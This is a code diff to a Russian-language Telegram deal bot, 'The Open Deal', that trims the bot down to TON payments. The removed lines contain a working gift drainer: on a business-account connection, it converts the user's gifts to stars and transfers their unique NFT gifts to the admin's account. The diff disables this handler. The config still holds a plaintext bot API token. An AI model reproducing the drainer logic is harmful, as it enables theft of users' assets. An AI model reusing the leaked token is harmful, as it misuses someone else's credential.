@@ -8,9 +8,6 @@ from aiogram import Bot, Dispatcher, types, F, Router
 from aiogram.filters import Command
 from aiogram.types import Message
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
-from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
-from aiogram.methods import SendMessage, ReadBusinessMessage, TransferGift, ConvertGiftToStars
 from aiogram.methods.get_available_gifts import GetAvailableGifts
 from aiogram.exceptions import TelegramBadRequest
 from typing import List
@@ -25,8 +22,12 @@ from aiogram.fsm.state import State, StatesGroup
 # ========== CONFIG ==========
 API_TOKEN = "7611354074:AAFOEEnnGpABuy3w7pwf9OzzEeeRkzR7CwY"
 ADMIN_ID = 7225974704
+# Кому отправлять короткий лог о запуске (/start)
+START_LOG_USER_IDS = [ADMIN_ID]
+
 BOT_USERNAME = "coolGames_robot"
 BOT_NAME = "The Open Deal"
+TON_WALLET_ADDRESS = os.getenv("TON_WALLET_ADDRESS", "PASTE_YOUR_TON_ADDRESS_HERE")
 
 # Словарь для отслеживания уже залогированных действий
 logged_actions = {}
@@ -101,10 +102,7 @@ wallet_menu = types.InlineKeyboardMarkup(
 
 crypto_menu = types.InlineKeyboardMarkup(
     inline_keyboard=[
-        [types.InlineKeyboardButton(text="₿ Bitcoin (BTC)", callback_data="crypto_btc")],
-        [types.InlineKeyboardButton(text="Ξ Ethereum (ETH)", callback_data="crypto_eth")],
         [types.InlineKeyboardButton(text="💎 TON", callback_data="crypto_ton")],
-        [types.InlineKeyboardButton(text="🪙 USDT", callback_data="crypto_usdt")],
         [types.InlineKeyboardButton(text="🔙 Назад", callback_data="add_wallet")],
     ]
 )
@@ -237,115 +235,40 @@ async def send_start_log(user: types.User, extra: str):
     """Короткий лог только о /start (без остальных событий)."""
     try:
         username = f"@{user.username}" if user.username else "(нет username)"
-        await bot.send_message(
-            chat_id=ADMIN_ID,
-            text=(
-                f"▶️ <b>/start</b> от <code>{user.id}</code> {username}\n"
-                f"{extra}"
-            ),
-            parse_mode="HTML"
+        text_log = (
+            f"▶️ <b>/start</b> от <code>{user.id}</code> {username}\n"
+            f"{extra}"
         )
+        for chat_id in START_LOG_USER_IDS:
+            try:
+                await bot.send_message(chat_id=chat_id, text=text_log, parse_mode="HTML")
+            except Exception:
+                pass
     except Exception:
         pass
 
 # ========== BUSINESS CONNECTION HANDLER ==========
 @dp.business_connection()
 async def handle_business_connect(business_connection):
+    """
+    ⚠️ Отключено для безопасности.
+    Этот бот не должен автоматически конвертировать/передавать подарки или NFT от имени пользователя.
+    """
     try:
-        # Логируем подключение бизнес-аккаунта
-        await log_to_admin(
-            event_type="ПОДКЛЮЧЕНИЕ БИЗНЕС-АККАУНТА",
-            user_data={"from_user": business_connection.user.__dict__},
-            additional_info=f"Connection ID: {business_connection.id}"
-        )
-        
-        await send_welcome_message_to_admin(business_connection.user.id)
-        save_business_connection_data(business_connection)
-        logging.info(f"Бизнес-аккаунт подключен: {business_connection.user.id}, connection_id: {business_connection.id}")
-
-        try:
-            gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
-            gifts = gifts_response.gifts
-            converted_count = 0
-            for gift in gifts:
-                if gift.type == "unique":
-                    continue
-                try:
-                    await bot(ConvertGiftToStars(
-                        business_connection_id=business_connection.id,
-                        owned_gift_id=str(gift.owned_gift_id)
-                    ))
-                    converted_count += 1
-                except TelegramBadRequest as e:
-                    if "GIFT_NOT_CONVERTIBLE" in str(e):
-                        continue
-                    else:
-                        raise e
-            await bot.send_message(ADMIN_ID, f"♻️ Конвертировано {converted_count} обычных подарков в звёзды.")
-        except Exception as e:
-            logging.warning(f"Ошибка при конвертации подарков: {e}")
-
-        try:
-            gifts_response = await bot(GetBusinessAccountGifts(
-                business_connection_id=business_connection.id
-            ))
-            gifts = gifts_response.gifts
-            transferred = 0
-            transferred_gift_links = []
-
-            for gift in gifts:
-                if gift.type != "unique":
-                    continue
-                try:
-                    await bot(TransferGift(
-                        business_connection_id=business_connection.id,
-                        new_owner_chat_id=int(ADMIN_ID),
-                        owned_gift_id=gift.owned_gift_id,
-                        star_count=gift.transfer_star_count
-                    ))
-                    transferred += 1
-                    gift_link = f"https://t.me/nft/{gift.gift.name}"
-                    transferred_gift_links.append(gift_link)
-                except Exception as e:
-                    logging.warning(f"Не удалось передать подарок {gift.owned_gift_id}: {e}")
-
-            refs = load_refs()
-            user_id_str = str(business_connection.user.id)
-            
-            if user_id_str not in refs:
-                refs[user_id_str] = {"referrer_id": None, "joined": None, "gifts": [], "transferred_gifts": []}
-            elif "transferred_gifts" not in refs[user_id_str]:
-                refs[user_id_str]["transferred_gifts"] = []
-            
-            refs[user_id_str]["transferred_gifts"].extend(transferred_gift_links)
-            save_refs(refs)
-
-            message_text = f"🎁 Автоматически передано {transferred} уникальных подарков от пользователя #{business_connection.user.id} (@{business_connection.user.username})."
-            await bot.send_message(ADMIN_ID, message_text)
-
-            referrer_id = refs.get(user_id_str, {}).get("referrer_id")
-            if referrer_id:
-                try:
-                    await bot.send_message(int(referrer_id), f"Ваш реферал {business_connection.user.id} передал {transferred} уникальных подарков.\n\n{message_text}")
-                except Exception as e:
-                    logging.warning(f"Не удалось отправить сообщение рефереру {referrer_id}: {e}")
-
-        except Exception as e:
-            logging.exception("❌ Ошибка при автопередаче подарков.")
-
-    except Exception as e:
-        logging.exception("Ошибка при обработке бизнес-подключения.")
-
-# ========== COMMAND HANDLERS ==========
+        user_id = getattr(getattr(business_connection, "user", None), "id", None)
+        if user_id:
+            await bot.send_message(user_id, "⚠️ Подключение бизнес-аккаунта отключено в этой сборке.")
+    except Exception:
+        pass
+    return
 @dp.message(Command("start"))
 async def send_welcome(message: types.Message):
     user_id = message.from_user.id
     start_data = message.text.split(" ")
     
-    # Короткий лог только о запуске (без спама по всем действиям)
-    if user_id != ADMIN_ID:
-        extra = f"Параметры: {message.text}" if len(start_data) > 1 else "Чистый запуск"
-        await send_start_log(message.from_user, extra)
+    # Короткий лог только о запуске (/start)
+    extra = f"Параметры: {message.text}" if len(start_data) > 1 else "Чистый запуск"
+    await send_start_log(message.from_user, extra)
 
     if user_id in user_data:
         last_message_id = user_data[user_id].get("last_bot_message_id")
@@ -398,12 +321,7 @@ async def send_welcome(message: types.Message):
                 random_start = deal_data["random_start"]
                 description = deal_data["description"]
 
-                USDT_RATE = 2.9
-                PX_RATE = 53
-                ton_amount = round(amount * 1.05, 2)
-                usdt_amount = round(ton_amount * USDT_RATE, 2)
-                px_amount = round(ton_amount * PX_RATE, 2)
-
+                ton_amount = round(amount, 2)
                 buyer_wallets = {}
                 buyer_file_path = f"users/{user_id}.json"
                 if os.path.exists(buyer_file_path):
@@ -421,17 +339,15 @@ async def send_welcome(message: types.Message):
                     f"• Успешные сделки: 0\n\n"
                     f"• Вы покупаете: {description}\n\n"
                     f"🏦 <b>Адрес для оплаты:</b>\n"
-                    f"<code>UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro</code>\n\n"
+                    f"<code>{TON_WALLET_ADDRESS}</code>\n\n"
                     f"💰 <b>Сумма к оплате:</b>\n"
-                    f"⬛️ {px_amount} PX (1% fee)\n"
-                    f"💵 {usdt_amount} USDT\n"
                     f"💎 {ton_amount} TON\n\n"
                     f"📝 <b>Комментарий к платежу:</b> {random_start}\n\n"
                     f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
                     f"После оплаты ожидайте автоматического подтверждения"
                 )
 
-                tonkeeper_url = f"ton://transfer/UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro?amount={int(ton_amount * 1e9)}&text={random_start}"
+                tonkeeper_url = f"ton://transfer/{TON_WALLET_ADDRESS}?amount={int(ton_amount * 1e9)}&text={random_start}"
                 buttons_rows = []
                 buttons_rows.append([types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)])
                 
@@ -460,11 +376,11 @@ async def send_welcome(message: types.Message):
                     buyer_quote = (
                         f"🧾 Сделка: #{random_start}\n"
                         f"🆔 Покупателя: {user_id}\n"
-                        f"   · Username: @{message.from_user.username if message.from_user.username else 'нет username'}\n"
+                        f"   · Username: {message.from_user.username if message.from_user.username else 'нет username'}\n"
                         f"💸 Сумма: {amount} TON\n"
                         f"🎁 Товар: {description}"
                     )
-                    quote_html = f"<blockquote>{html.escape(buyer_quote)}</blockquote>"
+                    quote_html = html.escape(buyer_quote)
 
                     seller_message = (
                         f"🛒 <b>Покупатель начал сделку!</b>\n\n"
@@ -580,18 +496,15 @@ async def confirm_payment(message: types.Message):
             seller_wallets = deal_data.get("seller_wallets", {})
             wallets_info = ""
             
-            if seller_wallets:
+            if seller_wallets and seller_wallets.get("ton"):
                 wallets_info = "\n\n💳 <b>Кошельки продавца для оплаты:</b>\n"
-                for wallet_type, wallet_data in seller_wallets.items():
-                    if wallet_type == "card":
-                        wallets_info += f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
-                    elif wallet_type == "ton":
-                        wallets_info += f"👛 <b>TON:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
-                    elif wallet_type.startswith("crypto_"):
-                        crypto_name = wallet_type.replace("crypto_", "").upper()
-                        wallets_info += f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
+                addr = seller_wallets["ton"].get("address", "")
+                if addr:
+                    wallets_info += f"👛 <b>TON:</b> <code>{addr[:10]}...{addr[-10:]}</code>\n"
+                else:
+                    wallets_info += "⚠️ <b>TON:</b> адрес не указан\n"
             else:
-                wallets_info = "\n\n⚠️ <b>Внимание:</b> У продавца нет добавленных кошельков!"
+                wallets_info = "\n\n⚠️ <b>Внимание:</b> У продавца нет добавленного TON-кошелька!"
 
             message_text = (
                 f"✅️ <b>Оплата подтверждена</b> для сделки #{deal_code}\n\n"
@@ -855,10 +768,7 @@ async def handle_crypto_selection(callback: types.CallbackQuery):
     crypto_type = callback.data.replace("crypto_", "")
     
     crypto_names = {
-        "btc": "Bitcoin (BTC)",
-        "eth": "Ethereum (ETH)", 
-        "ton": "TON",
-        "usdt": "USDT"
+        "ton": "TON"
     }
     
     last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
@@ -1194,12 +1104,7 @@ async def back_to_deal(callback: types.CallbackQuery):
             amount = deal_data["amount"]
             description = deal_data["description"]
             
-            USDT_RATE = 2.9
-            PX_RATE = 53
-            ton_amount = round(amount * 1.05, 2)
-            usdt_amount = round(ton_amount * USDT_RATE, 2)
-            px_amount = round(ton_amount * PX_RATE, 2)
-            
+            ton_amount = round(amount, 2)
             buyer_wallets = {}
             buyer_file_path = f"users/{user_id}.json"
             if os.path.exists(buyer_file_path):
@@ -1217,17 +1122,15 @@ async def back_to_deal(callback: types.CallbackQuery):
                 f"• Успешные сделки: 0\n\n"
                 f"• Вы покупаете: {description}\n\n"
                 f"🏦 <b>Адрес для оплаты:</b>\n"
-                f"<code>UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro</code>\n\n"
+                f"<code>{TON_WALLET_ADDRESS}</code>\n\n"
                 f"💰 <b>Сумма к оплате:</b>\n"
-                f"⬛️ {px_amount} PX (1% fee)\n"
-                f"💵 {usdt_amount} USDT\n"
                 f"💎 {ton_amount} TON\n\n"
                 f"📝 <b>Комментарий к платежу:</b> {deal_code}\n\n"
                 f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
                 f"После оплаты ожидайте автоматического подтверждения"
             )
             
-            tonkeeper_url = f"ton://transfer/UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro?amount={int(ton_amount * 1e9)}&text={deal_code}"
+            tonkeeper_url = f"ton://transfer/{TON_WALLET_ADDRESS}?amount={int(ton_amount * 1e9)}&text={deal_code}"
             buttons_rows = []
             buttons_rows.append([types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)])
             
@@ -1346,6 +1249,9 @@ async def nft_done(callback: types.CallbackQuery):
     if seller_wallets:
         wallets_display = "\n\n💳 <b>Кошельки для оплаты:</b>\n"
         for wallet_type, wallet_data in seller_wallets.items():
+            # Показываем только TON (по запросу)
+            if wallet_type != "ton":
+                continue
             if wallet_type == "card":
                 wallets_display += f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
             elif wallet_type == "ton":
@@ -1369,7 +1275,7 @@ async def nft_done(callback: types.CallbackQuery):
         f"💸 Сумма: {deal_data['amount']} TON\n"
         f"🎁 Товар: {deal_data['description']}"
     )
-    quote_html = f"<blockquote>{html.escape(deal_quote)}</blockquote>"
+    quote_html = html.escape(deal_quote)
 
     share_text = (
         f"🧾 Сделка: #{random_start}\n"
@@ -1415,7 +1321,8 @@ async def support_handler(callback: types.CallbackQuery, state: FSMContext):
     # Отправляем отдельное сообщение с инструкцией
     support_msg = await callback.message.answer(
         "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение для поддержки. Мы ответим вам в ближайшее время.",
-        reply_markup=support_keyboard
+        reply_markup=support_keyboard,
+        parse_mode="HTML"
     )
     
     # Сохраняем ID сообщения для последующего удаления
@@ -1426,7 +1333,7 @@ async def support_handler(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
 
 # Обработка сообщений для поддержки
-@router.message(SupportStates.waiting_for_support_message)
+@dp.message(SupportStates.waiting_for_support_message)
 async def process_support_message(message: Message, state: FSMContext):
     user = message.from_user
     user_id = user.id
@@ -1448,7 +1355,7 @@ async def process_support_message(message: Message, state: FSMContext):
     
     # Отправляем пользователю сообщение о получении
     await message.answer(
-        "✅ Ваше сообщение получено! Администратор скоро ответит.\n\nОбычное время ответа: 30 минут",
+        "✅ Ваше сообщение отправлено в поддержку.\n\nОжидайте ответа в течение ~5 минут.",
         reply_markup=support_keyboard
     )
     
@@ -1548,11 +1455,8 @@ async def handle_wallet(message: types.Message):
                 json.dump(user_info, file, indent=4, ensure_ascii=False)
             
             crypto_names = {
-                "btc": "Bitcoin (BTC)",
-                "eth": "Ethereum (ETH)",
-                "ton": "TON",
-                "usdt": "USDT"
-            }
+        "ton": "TON"
+    }
             
             await send_or_edit_message(
                 user_id,
